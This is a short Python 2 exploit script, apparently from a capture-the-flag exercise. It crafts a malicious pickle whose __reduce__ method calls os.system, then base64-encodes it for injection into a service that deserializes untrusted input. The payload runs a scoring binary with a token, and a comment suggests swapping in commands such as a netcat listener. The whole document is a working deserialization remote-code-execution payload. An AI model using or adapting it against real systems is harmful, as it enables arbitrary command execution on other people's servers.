
#Pickle some Python code and turn it into base64. You can use this to issue commands (like an nc listener)

import os
import cPickle
import base64
class Blah(object):
  def __reduce__(self):
    return (os.system,("/usr/local/bin/score 0c0999de-b666-4e63-a253-58123553ba96 ",))

print base64.b64encode( cPickle.dumps(Blah()))
